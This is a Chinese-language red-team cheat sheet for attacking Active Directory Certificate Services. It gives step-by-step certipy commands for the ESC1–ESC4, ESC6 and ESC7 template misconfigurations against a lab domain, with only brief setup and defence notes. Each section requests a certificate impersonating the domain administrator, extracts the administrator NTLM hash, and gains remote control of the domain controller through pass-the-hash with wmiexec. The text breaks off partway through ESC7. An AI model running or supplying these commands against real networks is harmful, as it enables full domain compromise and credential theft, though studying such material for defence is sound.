# ADCS Attack Surface - ADCS攻击面

## 信息收集

### 获取证书模板以及ADCS信息

```shell
# 模板
proxychains certipy find -u <域用户>@<域名> -p <密码> -dc-ip <域控服务器IP> -dns-tcp
# 示例
proxychains certipy find -u worker@redteam.com -p worker@123 -dc-ip 10.10.10.1 -dns-tcp
```

![info](../images/AD/ADCS/adcs-info-1.png)

### 获取ADCS服务器域名

```shell
# 模板
grep "DNS Name" <刚才收集的信息文件名>
# 示例
grep "DNS Name" 20230915154218_Certipy.txt
```

![info](../images/AD/ADCS/adcs-info-2.png)

#### 获取CA证书颁发机构名称

```shell
# 模板
grep "DNS Name" <刚才收集的信息文件名>
# 示例
grep "CA Name" 20230915164357_Certipy.txt
```

![info](../images/AD/ADCS/adcs-info-3.png)

## 权限提升

### ESC1证书模板错误配置攻击

#### 环境配置

- certsrv.msc打开证书颁发机构
- 右击证书模板 > 管理 > 右击现有的证书模板 > 复制模板
- 按照以下条件配置错误模板
- 右击证书模板 > 新建 > 要颁发的证书模板

#### 利用条件

- 颁发CA授予低权限用户请求权限（默认）
- 模板中CA管理员审批未启用（默认）
- 模板中不需要授权的签名（默认）
- 模板允许低权限用户注册
- 模板定义了启用认证的EKU
- 证书模板允许请求者在CSR中指定一个SAN

![info](../images/AD/ADCS/adcs-esc1-cnd-1.png)

![info](../images/AD/ADCS/adcs-esc1-cnd-2.png)

![info](../images/AD/ADCS/adcs-esc1-cnd-3.png)

#### 前期准备

- 获取证书模板漏洞信息

![info](../images/AD/ADCS/adcs-esc1-info-1.png)

#### 攻击方法

- 申请域管理员证书模板

```shell
# 模板
proxychains certipy req -username <域用户>@<域名> -password <密码> -ca <证书颁发机构名称> -target <ADCS服务器域名> -template <证书模板> -upn administrator@<域名> -dc-ip <域控服务器IP> -dns-tcp
# 示例
proxychains certipy req -username worker@redteam.com -password worker@123 -ca CA -target adcs.redteam.com -template TEST1 -upn administrator@redteam.com -dc-ip 10.10.10.1 -dns-tcp
```

![info](../images/AD/ADCS/adcs-esc1-att-1.png)

- 获取域管理员HASH

```shell
# 模板
proxychains certipy auth -pfx <证书文件> -dc-ip <域名>
# 示例
proxychains certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

![info](../images/AD/ADCS/adcs-esc1-att-2.png)

- 使用exec工具远控域控服务器

```shell
# 模板
proxychains python3 wmiexec.py -no-pass <域名>/<域管理员用户名>@<域控服务器IP> -hashes <NTLM HASH>
# 示例
proxychains python3 wmiexec.py -no-pass redteam.com/administrator@DC.redteam.com -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24
```

![info](../images/AD/ADCS/adcs-esc1-att-3.png)

### ESC2证书模板错误配置攻击

#### 利用条件

- 颁发CA授予低权限用户请求权限（默认）
- 模板中CA管理员审批未启用（默认）
- 模板中不需要授权的签名（默认）
- 模板允许低权限用户注册
- 证书模板中定义了No EKU或Any EKU

![info](../images/AD/ADCS/adcs-esc2-cnd-1.png)

![info](../images/AD/ADCS/adcs-esc2-cnd-2.png)

![info](../images/AD/ADCS/adcs-esc2-cnd-3.png)

#### 前期准备

- 获取证书模板漏洞信息

![info](../images/AD/ADCS/adcs-esc2-info-1.png)

#### 攻击方法

- 申请域管理员证书模板

```shell
# 模板
proxychains certipy req -username <域用户>@<域名> -password <密码> -ca <证书颁发机构名称> -target <ADCS服务器域名> -template <证书模板> -upn administrator@<域名> -dc-ip <域控服务器IP> -dns-tcp
# 示例
proxychains certipy req -username worker@redteam.com -password worker@123 -ca CA -target adcs.redteam.com -template TEST2 -upn administrator@redteam.com -dc-ip 10.10.10.1 -dns-tcp
```

![info](../images/AD/ADCS/adcs-esc2-att-1.png)

- 获取域管理员HASH

```shell
# 模板
proxychains certipy auth -pfx <证书文件> -dc-ip <域名>
# 示例
proxychains certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

![info](../images/AD/ADCS/adcs-esc2-att-2.png)

- 使用exec工具远控域控服务器

```shell
# 模板
proxychains python3 wmiexec.py -no-pass <域名>/<域管理员用户名>@<域控服务器IP> -hashes <NTLM HASH>
# 示例
proxychains python3 wmiexec.py -no-pass redteam.com/administrator@DC.redteam.com -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24
```

![info](../images/AD/ADCS/adcs-esc2-att-3.png)

### ESC3证书模板错误配置攻击

#### 利用条件

- 颁发CA授予低权限用户请求权限（默认）
- 模板中CA管理员审批未启用（默认）
- 模板中不需要授权的签名（默认）
- 模板允许低权限用户注册
- 证书模板中定义了证书请求代理EKU(1.3.6.1.4.1.311.20.2.1)

![info](../images/AD/ADCS/adcs-esc3-cnd-1.png)

![info](../images/AD/ADCS/adcs-esc3-cnd-2.png)

![info](../images/AD/ADCS/adcs-esc3-cnd-3.png)

#### 前期准备

- 获取证书模板漏洞信息

![info](../images/AD/ADCS/adcs-esc3-info-1.png)

#### 攻击方法

- 申请当前用户证书模板

```shell
# 模板
proxychains certipy req -username <域用户>@<域名> -password <密码> -ca <证书颁发机构名称> -target <ADCS服务器域名> -template <证书模板> -upn administrator@<域名> -dc-ip <域控服务器IP> -dns-tcp
# 示例
proxychains certipy req -username worker@redteam.com -password worker@123 -ca CA -target adcs.redteam.com -template TEST3 -dc-ip 10.10.10.1 -dns-tcp
```

![info](../images/AD/ADCS/adcs-esc3-att-1.png)

- 申请域管理员证书模板

```shell
# 模板
proxychains certipy req -username <域用户>@<域名> -password <密码> -ca <证书颁发机构名称> -target <ADCS服务器域名> -template User -on-behalf-of '<域名>\Administrator' -pfx worker.pfx -dc-ip <域控服务器IP> -dns-tcp
# 示例
proxychains certipy req -username worker@redteam.com -password worker@123 -ca CA -target adcs.redteam.com -template User -on-behalf-of 'redteam\administrator' -pfx worker.pfx -dc-ip 10.10.10.1 -dns-tcp
```

![info](../images/AD/ADCS/adcs-esc3-att-2.png)

```shell
# 模板
proxychains certipy auth -pfx <证书文件> -dc-ip <域名>
# 示例
proxychains certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

![info](../images/AD/ADCS/adcs-esc3-att-3.png)

- 使用exec工具远控域控服务器

```shell
# 模板
proxychains python3 wmiexec.py -no-pass <域名>/<域管理员用户名>@<域控服务器IP> -hashes <NTLM HASH>
# 示例
proxychains python3 wmiexec.py -no-pass redteam.com/administrator@DC.redteam.com -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24
```

![info](../images/AD/ADCS/adcs-esc3-att-4.png)

### ESC4证书模板错误配置攻击

#### 利用条件

![info](../images/AD/ADCS/adcs-esc4-cnd-1.png)

![info](../images/AD/ADCS/adcs-esc4-cnd-2.png)

![info](../images/AD/ADCS/adcs-esc4-cnd-3.png)

#### 前期准备

- 获取证书模板漏洞信息

![info](../images/AD/ADCS/adcs-esc4-info-1.png)

#### 攻击方法

- 使用ESC1模板覆盖ESC4模板并保存ESC4旧模板

```shell
# 模板
proxychains certipy template -username <域用户>@<域名> -password <密码> -template TEST4 -save-old -dc-ip <域控服务器IP> -dns-tcp
# 示例
proxychains certipy template -username worker@redteam.com -password worker@123 -template TEST4 -save-old -dc-ip 10.10.10.1 -dns-tcp
```

![info](../images/AD/ADCS/adcs-esc4-att-1.png)

- 申请域管理员证书模板

```shell
# 模板
proxychains certipy req -username <域用户>@<域名> -password <密码> -ca <证书颁发机构名称> -target <ADCS服务器域名> -template <证书模板> -upn administrator@<域名> -dc-ip <域控服务器IP> -dns-tcp
# 示例
proxychains certipy req -username worker@redteam.com -password worker@123 -ca CA -target adcs.redteam.com -template TEST4 -upn administrator@redteam.com -dc-ip 10.10.10.1 -dns-tcp
```

![info](../images/AD/ADCS/adcs-esc4-att-2.png)

- 获取域管理员HASH

```shell
# 模板
proxychains certipy auth -pfx <证书文件> -dc-ip <域名>
# 示例
proxychains certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

![info](../images/AD/ADCS/adcs-esc4-att-3.png)

- 使用exec工具远控域控服务器

```shell
# 模板
proxychains python3 wmiexec.py -no-pass <域名>/<域管理员用户名>@<域控服务器IP> -hashes <NTLM HASH>
# 示例
proxychains python3 wmiexec.py -no-pass redteam.com/administrator@DC.redteam.com -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24
```

![info](../images/AD/ADCS/adcs-esc4-att-4.png)

- 恢复ESC4模板

```shell
# 模板
proxychains certipy template -username <域用户>@<域名> -password <密码> -template ESC4-Test -configuration ESC4-Test.jsonpython3 wmiexec.py -no-pass <域名>/<域管理员用户名>@<域控服务器IP> -hashes <NTLM HASH>
# 示例
proxychains certipy template -username worker@redteam.com -password worker@123 -template TEST4 -configuration TEST4.json -dc-ip 10.10.10.1 -dns-tcp
```

![info](../images/AD/ADCS/adcs-esc4-att-5.png)

### ESC6证书模板错误配置攻击

#### 利用条件

- 启用EDITF_ATTRIBUTESUBJECTALTNAME2标志

##### 漏洞环境配置

- 使用以下命令配置漏洞环境，配位完毕后要重启服务（这里修改User模板的属性）

```shell
# 模板
certutil -config "<ADCS域名>\<证书模板>" -setreg "policy\EditFlags" +EDITF_ATTRIBUTESUBJECTALTNAME2
# 示例
certutil -config "adcs.redteam.com\User" -setreg "policy\EditFlags" +EDITF_ATTRIBUTESUBJECTALTNAME2
```

![info](../images/AD/ADCS/adcs-esc5-cnd-1.png)

#### 前期准备

- 获取证书模板漏洞信息

![info](../images/AD/ADCS/adcs-esc5-info-1.png)

#### 攻击方法

- 申请域管理员证书

```shell
# 模板
proxychains certipy req -username <域用户>@<域名> -password <密码> -ca <证书颁发机构名称> -target <ADCS服务器域名> -template <证书模板> -upn administrator@<域名> -dc-ip <域控服务器IP> -dns-tcp
# 示例
proxychains certipy req -username worker@redteam.com -password worker@123 -ca CA -target adcs.redteam.com -template User -upn administrator@redteam.com -dc-ip 10.10.10.1 -dns-tcp
```

![info](../images/AD/ADCS/adcs-esc5-att-1.png)

- 获取域管理员HASH

```shell
# 模板
proxychains certipy auth -pfx <证书文件> -dc-ip <域名>
# 示例
proxychains certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

![info](../images/AD/ADCS/adcs-esc5-att-2.png)

- 使用exec工具远控域控服务器

```shell
# 模板
proxychains python3 wmiexec.py -no-pass <域名>/<域管理员用户名>@<域控服务器IP> -hashes <NTLM HASH>
# 示例
proxychains python3 wmiexec.py -no-pass redteam.com/administrator@DC.redteam.com -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24
```

![info](../images/AD/ADCS/adcs-esc5-att-3.png)

#### 防御方法

- 删除收影响模板的属性

```shell
# 模板
certutil -config "<ADCS服务器域名>\<模板名称>" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
# 示例
certutil -config "adcs.redteam.com\User" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

![info](../images/AD/ADCS/adcs-esc5-def-1.png)

### ESC7证书模板错误配置攻击

#### 利用条件

- 存在ESC1模板内容并附加以下设置

![esc7](../images/AD/ADCS/adcs-esc7-cnd-1.png)

#### 前期准备

- 获取证书模板漏洞信息

![esc7](../images/AD/ADCS/adcs-esc7-info-1.png)

#### 攻击方法

- 为当前账号赋予"管理证书"访问权限

```shell
# 模板
proxychains certipy ca -ca '<证书颁发机构名称>' -add-officer <被授权用户名> -username <用户名>@<域名> -password <密码> -dc-ip 10.10.10.1 -dns-tcp
# 示例
proxychains certipy ca -ca 'CA' -add-officer worker -username administrator@redteam.com -password 1qaz@WSX -dc-ip 10.10.10.1 -dns-tcp
```

